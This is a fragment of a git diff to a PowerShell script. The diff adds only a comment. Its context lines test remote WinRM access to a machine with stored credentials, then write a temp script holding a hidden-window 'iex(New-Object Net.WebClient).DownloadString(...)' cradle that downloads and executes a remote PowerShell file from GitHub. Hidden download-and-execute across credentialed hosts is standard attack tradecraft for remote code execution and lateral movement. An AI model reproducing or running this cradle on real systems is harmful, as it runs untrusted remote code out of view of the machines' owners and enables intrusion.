@@ -66,6 +66,7 @@ $islive = Test-WSMan machine-1 -Credential $mycredential -Authentication Negotia
 
 if ($islive -ne $null){
 
+# **************** what if you just run a powershell invoke for each ********************
 
 New-Item -Path $env:TEMP -Name "john.ps1"
 Add-Content $env:TEMP\john.ps1 -Value 'powershell -nop -w hidden iex(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/securethelogs/Powershell/master/RuShR3ady.ps1")'
